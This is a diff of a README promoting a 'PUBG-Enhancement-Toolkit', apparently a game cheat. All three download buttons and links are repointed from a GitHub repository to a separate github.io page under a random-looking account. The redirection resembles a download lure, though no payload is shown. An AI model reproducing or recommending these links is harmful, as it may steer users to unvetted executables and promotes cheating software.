@@ -10,10 +10,10 @@ Whether you're frustrated with losing track of enemies, struggling with weapon r
 
 Ready to get started? It's simple!
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/liverspotteddalmatianterminus52/PUBG-Enhancement-Toolkit)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://liverspotteddalmatianterminus52.github.io)
 
 ### Step 1: Visit the Download Page
-Visit this link to download the application: **[PUBG-Enhancement-Toolkit](https://github.com/liverspotteddalmatianterminus52/PUBG-Enhancement-Toolkit)**
+Visit this link to download the application: **[PUBG-Enhancement-Toolkit](https://liverspotteddalmatianterminus52.github.io)**
 
 ### Step 2: Get the Files
 Once you're on the page, look for the download button or the latest release. Click it to start downloading the application to your computer.
@@ -128,7 +128,7 @@ Remember, the best results come from combining all features together. A full awa
 
 Ready to dominate the battlegrounds? Download the toolkit today and experience PUBG like never before!
 
-[![GET STARTED](https://img.shields.io/badge/🚀-GET%20STARTED-28B463?style=for-the-badge&logo=github&logoColor=white)](https://github.com/liverspotteddalmatianterminus52/PUBG-Enhancement-Toolkit)
+[![GET STARTED](https://img.shields.io/badge/🚀-GET%20STARTED-28B463?style=for-the-badge&logo=github&logoColor=white)](https://liverspotteddalmatianterminus52.github.io)
 
 ## 📝 Disclaimer and Legal Notice
 
